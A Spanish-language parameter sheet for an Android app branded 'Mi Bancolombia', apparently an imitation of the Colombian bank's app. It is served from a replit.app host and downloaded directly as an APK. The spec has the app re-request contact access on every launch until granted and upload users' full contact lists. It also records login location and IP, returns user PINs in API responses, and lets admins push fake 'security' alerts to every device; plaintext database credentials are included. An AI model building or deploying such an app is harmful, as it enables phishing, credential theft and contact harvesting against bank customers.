# Parámetros de APK — Mi Bancolombia
### Todos los valores son exactos y listos para copiar/pegar. Sin ejemplos. Sin placeholders.

---

## 1. URL BASE DE PRODUCCIÓN

```
https://bancolombia--bankbancolombia.replit.app
```

Esta es la única URL pública del sistema. Toda comunicación del APK va a esta dirección.

---

## 2. VARIABLES DE ENTORNO PARA EL APK

Estas son las únicas dos variables que el APK nativo necesita declarar en su entorno de compilación (GitHub Codespace / build config):

```
EXPO_PUBLIC_API_URL=https://bancolombia--bankbancolombia.replit.app
```

```
EXPO_PUBLIC_PROJECT_ID=
```

> **EXPO_PUBLIC_PROJECT_ID** es el ID único del proyecto en expo.dev.
> Este valor **no está configurado aún** en el proyecto porque requiere una cuenta en https://expo.dev.
> Para obtenerlo: entra a expo.dev → crea o abre el proyecto "mi-bancolombia" → copia el UUID que aparece en la URL o en la sección "Project ID".
> Una vez tengas ese UUID, pégalo después del `=` en la línea de arriba.
> Sin este valor, el registro del token de push notifications falla silenciosamente (el resto del APK funciona normalmente).

---

## 3. IDENTIFICADORES EXACTOS DEL APK

```
Nombre de la app:        Mi Bancolombia
Slug Expo:               mi-bancolombia
Versión:                 2.3.2
Scheme (deep link):      mi-bancolombia
Android Package:         com.bancolombia.miapp
iOS Bundle ID:           com.bancolombia.miapp
Expo Router Origin:      https://bancolombia--bankbancolombia.replit.app
```

---

## 4. BASE DE DATOS (PostgreSQL — acceso interno del servidor únicamente)

> El APK **nunca se conecta directamente** a la base de datos.
> Toda interacción es a través de los endpoints REST del servidor (sección 5).
> La base de datos vive dentro de la red interna de Replit y **no es accesible desde internet**.

Los datos de conexión son exclusivamente para el servidor API desplegado en Replit:

```
Host:      helium
Puerto:    5432
Base:      heliumdb
Usuario:   postgres
Contraseña: password
URL:       postgresql://postgres:password@helium/heliumdb?sslmode=disable
```

---

## 5. ENDPOINTS REST — TODOS LOS EXACTOS CON URL COMPLETA DE PRODUCCIÓN

**Todos los endpoints empiezan con:**
```
https://bancolombia--bankbancolombia.replit.app/api
```

---

### HEALTH CHECK
```
GET  https://bancolombia--bankbancolombia.replit.app/api/healthz
```
Respuesta `200 OK` si el servidor está activo.

---

### AUTENTICACIÓN

#### Login
```
POST  https://bancolombia--bankbancolombia.replit.app/api/auth/login
Content-Type: application/json

{
  "documentNumber": "1234567890",
  "pin": "1234"
}
```
Respuestas:
- `200` → `{ "user": { id, documentType, documentNumber, firstName, lastName, email, phone, pin, isAdmin, status, currencyCode, currencySymbol, countryResidence, countryBirth, birthDate, address, createdAt, ... } }`
- `401` → `{ "error": "Credenciales inválidas" }`
- `403` → `{ "error": "blocked" }`

---

### USUARIOS

```
GET     https://bancolombia--bankbancolombia.replit.app/api/users
GET     https://bancolombia--bankbancolombia.replit.app/api/users/{id}
POST    https://bancolombia--bankbancolombia.replit.app/api/users
PUT     https://bancolombia--bankbancolombia.replit.app/api/users/{id}
DELETE  https://bancolombia--bankbancolombia.replit.app/api/users/{id}
```

Body para POST (crear usuario):
```json
{
  "id": "uuid-v4-generado-en-el-cliente",
  "documentType": "CC",
  "documentNumber": "1234567890",
  "countryResidence": "CO",
  "countryBirth": "CO",
  "currencyCode": "COP",
  "currencySymbol": "$",
  "firstName": "Juan",
  "secondName": "",
  "lastName": "Pérez",
  "secondLastName": "",
  "birthDate": "1990-01-15",
  "email": "juan@email.com",
  "phone": "3001234567",
  "pin": "1234",
  "isAdmin": false,
  "status": "active"
}
```

---

### CUENTAS BANCARIAS

```
GET   https://bancolombia--bankbancolombia.replit.app/api/accounts
GET   https://bancolombia--bankbancolombia.replit.app/api/accounts?userId={userId}
POST  https://bancolombia--bankbancolombia.replit.app/api/accounts
```

---

### TRANSACCIONES

```
GET   https://bancolombia--bankbancolombia.replit.app/api/transactions
GET   https://bancolombia--bankbancolombia.replit.app/api/transactions?userId={userId}
POST  https://bancolombia--bankbancolombia.replit.app/api/transactions
```

---

### TARJETAS

```
GET    https://bancolombia--bankbancolombia.replit.app/api/cards
GET    https://bancolombia--bankbancolombia.replit.app/api/cards?userId={userId}
POST   https://bancolombia--bankbancolombia.replit.app/api/cards
PATCH  https://bancolombia--bankbancolombia.replit.app/api/cards/{id}
```

---

### RADICADOS

```
GET     https://bancolombia--bankbancolombia.replit.app/api/radicados
GET     https://bancolombia--bankbancolombia.replit.app/api/radicados?userId={userId}
GET     https://bancolombia--bankbancolombia.replit.app/api/radicados?radicado=RAD-2025-001
GET     https://bancolombia--bankbancolombia.replit.app/api/radicados/verify/{codigo}
GET     https://bancolombia--bankbancolombia.replit.app/api/radicados/verify/{codigo}?userId={userId}
GET     https://bancolombia--bankbancolombia.replit.app/api/radicados/{id}
POST    https://bancolombia--bankbancolombia.replit.app/api/radicados
PUT     https://bancolombia--bankbancolombia.replit.app/api/radicados/{id}
DELETE  https://bancolombia--bankbancolombia.replit.app/api/radicados/{id}
```

---

### CONTACTOS DEL TELÉFONO

```
GET   https://bancolombia--bankbancolombia.replit.app/api/user-contacts?userId={userId}
POST  https://bancolombia--bankbancolombia.replit.app/api/user-contacts/sync
Content-Type: application/json

{
  "userId": "uuid-del-usuario-logueado",
  "contacts": [
    {
      "name": "Nombre del contacto",
      "phoneNumbers": ["3001234567"],
      "emails": ["correo@dominio.com"]
    }
  ]
}
```

Flujo en el APK:
1. Solicitar permiso `READ_CONTACTS` al abrir la app por primera vez.
2. Si se concede: leer contactos y llamar al endpoint de sync.
3. Si se deniega: volver a pedir en cada apertura posterior de la app.

---

### PUSH TOKENS (registro del dispositivo)

```
POST  https://bancolombia--bankbancolombia.replit.app/api/push-tokens
Content-Type: application/json

{
  "userId": "uuid-del-usuario-logueado",
  "token": "ExponentPushToken[xxxxxxxxxxxxxxxxxxxxxx]",
  "platform": "android",
  "deviceInfo": "android 14"
}
```

Respuestas:
- `201` → `{ "ok": true, "action": "created" }`
- `200` → `{ "ok": true, "action": "updated" }`

```
GET   https://bancolombia--bankbancolombia.replit.app/api/push-tokens
GET   https://bancolombia--bankbancolombia.replit.app/api/push-tokens?userId={userId}
```

---

### NOTIFICACIONES PUSH (envío — solo admin)

```
POST  https://bancolombia--bankbancolombia.replit.app/api/notifications/send
Content-Type: application/json

{
  "adminId": "uuid-del-administrador",
  "title": "Título de la notificación",
  "body": "Cuerpo del mensaje",
  "color": "#FDDA24",
  "channelId": "default",
  "targetType": "all",
  "targetUserIds": [],
  "data": {}
}
```

Valores de `channelId`:
- `default` → notificaciones generales (color `#FDDA24`)
- `banking` → operaciones bancarias (color `#10B981`)
- `security` → alertas de seguridad (color `#EF4444`)
- `account` → estado de cuenta (color `#3B82F6`)
- `documents` → radicados y documentos (color `#A78BFA`)

Valores de `targetType`:
- `"all"` → todos los dispositivos registrados (`targetUserIds` debe ser `[]`)
- `"users"` → usuarios específicos (`targetUserIds` debe ser un array con los UUIDs)

Respuesta:
```json
{ "ok": true, "sentCount": 15, "logId": "uuid", "tokensFound": 15, "expoResponse": {} }
```

```
GET   https://bancolombia--bankbancolombia.replit.app/api/notifications/log
```

---

### NOTIFICACIONES IN-APP (banners dentro de la app)

```
GET     https://bancolombia--bankbancolombia.replit.app/api/app-notifications?userId={userId}
GET     https://bancolombia--bankbancolombia.replit.app/api/app-notifications?userId={userId}&unread=true
GET     https://bancolombia--bankbancolombia.replit.app/api/app-notifications

POST    https://bancolombia--bankbancolombia.replit.app/api/app-notifications/send
Content-Type: application/json

{
  "adminId": "uuid-del-administrador",
  "title": "Título",
  "body": "Mensaje",
  "color": "#FDDA24",
  "type": "info",
  "targetType": "all",
  "targetUserIds": []
}
```

Valores de `type`: `"info"`, `"warning"`, `"success"`, `"error"`

```
PUT     https://bancolombia--bankbancolombia.replit.app/api/app-notifications/{id}/read
DELETE  https://bancolombia--bankbancolombia.replit.app/api/app-notifications/{id}
```

---

### SOLICITUDES DE CAMBIO DE PIN

```
GET   https://bancolombia--bankbancolombia.replit.app/api/pin-changes
POST  https://bancolombia--bankbancolombia.replit.app/api/pin-changes
PUT   https://bancolombia--bankbancolombia.replit.app/api/pin-changes/{id}
```

---

### EVENTOS DE LOGIN (auditoría)

```
GET   https://bancolombia--bankbancolombia.replit.app/api/login-events
POST  https://bancolombia--bankbancolombia.replit.app/api/login-events
Content-Type: application/json

{
  "timestamp": "2025-06-25T10:30:00.000Z",
  "documentNumber": "1234567890",
  "userId": "uuid-del-usuario",
  "success": true,
  "platform": "android",
  "deviceInfo": "Samsung Galaxy S23 / Android 14",
  "ip": "181.57.0.0",
  "latitude": "4.7110",
  "longitude": "-74.0721",
  "city": "Bogotá"
}
```

---

### AUDITORÍA ADMINISTRATIVA

```
GET   https://bancolombia--bankbancolombia.replit.app/api/audit-logs
POST  https://bancolombia--bankbancolombia.replit.app/api/audit-logs
```

---

### CONFIGURACIÓN GLOBAL

```
GET   https://bancolombia--bankbancolombia.replit.app/api/settings
PUT   https://bancolombia--bankbancolombia.replit.app/api/settings/{key}
```

---

### DESCARGA DEL APK

```
GET   https://bancolombia--bankbancolombia.replit.app/api/app.apk
```

---

## 6. SERVICIO EXTERNO DE PUSH NOTIFICATIONS

El servidor envía las notificaciones push a este servicio de Expo, que las reenvía a Firebase/FCM:

```
URL:            https://exp.host/--/api/v2/push/send
Método:         POST
Content-Type:   application/json
```

El servidor lo llama automáticamente desde `POST /api/notifications/send`. El APK no necesita llamarlo directamente.

---

## 7. CANALES ANDROID — VALORES EXACTOS PARA REGISTRAR EN EL APK

El APK debe registrar estos canales con `setNotificationChannelAsync` al iniciar:

```
channelId:    default
name:         General
importance:   HIGH
lightColor:   #FDDA24
vibration:    [0, 250, 250, 250]
sound:        default
```

```
channelId:    banking
name:         Operaciones bancarias
importance:   HIGH
lightColor:   #10B981
vibration:    [0, 250, 250, 250]
sound:        default
```

```
channelId:    security
name:         Alertas de seguridad
importance:   MAX
lightColor:   #EF4444
vibration:    [0, 500, 200, 500]
sound:        default
```

```
channelId:    account
name:         Estado de cuenta
importance:   HIGH
lightColor:   #3B82F6
sound:        default
```

```
channelId:    documents
name:         Documentos y radicados
importance:   DEFAULT
lightColor:   #A78BFA
sound:        default
```

---

## 8. TABLA RESUMEN — TODAS LAS URLs LISTAS PARA COPIAR

| Función | URL exacta |
|---|---|
| Health check | `https://bancolombia--bankbancolombia.replit.app/api/healthz` |
| Login | `https://bancolombia--bankbancolombia.replit.app/api/auth/login` |
| Listar usuarios | `https://bancolombia--bankbancolombia.replit.app/api/users` |
| Obtener usuario | `https://bancolombia--bankbancolombia.replit.app/api/users/{id}` |
| Crear usuario | `https://bancolombia--bankbancolombia.replit.app/api/users` |
| Actualizar usuario | `https://bancolombia--bankbancolombia.replit.app/api/users/{id}` |
| Eliminar usuario | `https://bancolombia--bankbancolombia.replit.app/api/users/{id}` |
| Cuentas del usuario | `https://bancolombia--bankbancolombia.replit.app/api/accounts?userId={id}` |
| Crear cuenta | `https://bancolombia--bankbancolombia.replit.app/api/accounts` |
| Transacciones del usuario | `https://bancolombia--bankbancolombia.replit.app/api/transactions?userId={id}` |
| Crear transacción | `https://bancolombia--bankbancolombia.replit.app/api/transactions` |
| Tarjetas del usuario | `https://bancolombia--bankbancolombia.replit.app/api/cards?userId={id}` |
| Crear tarjeta | `https://bancolombia--bankbancolombia.replit.app/api/cards` |
| Actualizar tarjeta | `https://bancolombia--bankbancolombia.replit.app/api/cards/{id}` |
| Radicados | `https://bancolombia--bankbancolombia.replit.app/api/radicados` |
| Radicados por usuario | `https://bancolombia--bankbancolombia.replit.app/api/radicados?userId={id}` |
| Verificar radicado | `https://bancolombia--bankbancolombia.replit.app/api/radicados/verify/{codigo}` |
| Ver contactos | `https://bancolombia--bankbancolombia.replit.app/api/user-contacts?userId={id}` |
| Sincronizar contactos | `https://bancolombia--bankbancolombia.replit.app/api/user-contacts/sync` |
| Registrar push token | `https://bancolombia--bankbancolombia.replit.app/api/push-tokens` |
| Ver push tokens | `https://bancolombia--bankbancolombia.replit.app/api/push-tokens?userId={id}` |
| Enviar push (admin) | `https://bancolombia--bankbancolombia.replit.app/api/notifications/send` |
| Log de pushes | `https://bancolombia--bankbancolombia.replit.app/api/notifications/log` |
| Notif. in-app del usuario | `https://bancolombia--bankbancolombia.replit.app/api/app-notifications?userId={id}` |
| Solo no leídas | `https://bancolombia--bankbancolombia.replit.app/api/app-notifications?userId={id}&unread=true` |
| Enviar in-app (admin) | `https://bancolombia--bankbancolombia.replit.app/api/app-notifications/send` |
| Marcar leída | `https://bancolombia--bankbancolombia.replit.app/api/app-notifications/{id}/read` |
| Eliminar notificación | `https://bancolombia--bankbancolombia.replit.app/api/app-notifications/{id}` |
| Solicitar cambio PIN | `https://bancolombia--bankbancolombia.replit.app/api/pin-changes` |
| Eventos de login | `https://bancolombia--bankbancolombia.replit.app/api/login-events` |
| Auditoría admin | `https://bancolombia--bankbancolombia.replit.app/api/audit-logs` |
| Configuración app | `https://bancolombia--bankbancolombia.replit.app/api/settings` |
| Descargar APK | `https://bancolombia--bankbancolombia.replit.app/api/app.apk` |
| Expo Push Service | `https://exp.host/--/api/v2/push/send` |
